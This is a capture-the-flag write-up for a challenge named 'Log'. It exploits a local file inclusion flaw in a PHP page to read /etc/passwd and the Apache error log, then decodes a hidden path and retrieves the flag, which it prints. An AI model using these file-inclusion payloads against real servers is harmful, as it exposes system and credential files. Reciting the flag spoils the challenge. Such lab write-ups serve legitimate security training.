## Challenge: Log

### Description: GET the right file.

### Solution:

 - opening the link we find many pages, checking the source we find click-here_00.php placed differently in position.
 - checking checking click-here_00.php
 > You got the right 'file' :)
 - here ```file``` is highlighted and in description we see ```GET```
 - using file as parameter  
 > click-here_00.php/?file=/etc/passwd
 - we get access to file, `Local file inclusion vulnerability` 
 - using php filter check the source code of click-here_00.php, we find
 > There is some error in logs try to access it.
 - This says to check the error.log
 - server runs on apache2, so check the error.log of apache2
 > click-here_00.php/?file=/var/log/apache2/error.log
 - on the top we find something odd
 > `----------]<-<---<-------<---------->>>>+[<<-----------------,<<--,>>,<<------,>>,<<+++++++++++,>>,<<------,>>,<<------------,++++,++,++++++++,---------------,++++++++++++,-,-----,+++++++,>---------------,<-------,+++++++++,,+,>>+,<<----------------,----,++++,`
 - this is `reversefuck language` decoding it
 > /f/l/a/g/somethingUneed.txt
 - check that file, we get the flag.
 > click-here_00.php/?file=/f/l/a/g/somethingUneed.txt
 
 ### Flag: `BSDCTF{L0cal_f1L3_InClu$10N_1$_v3RY_P015On0u$}`
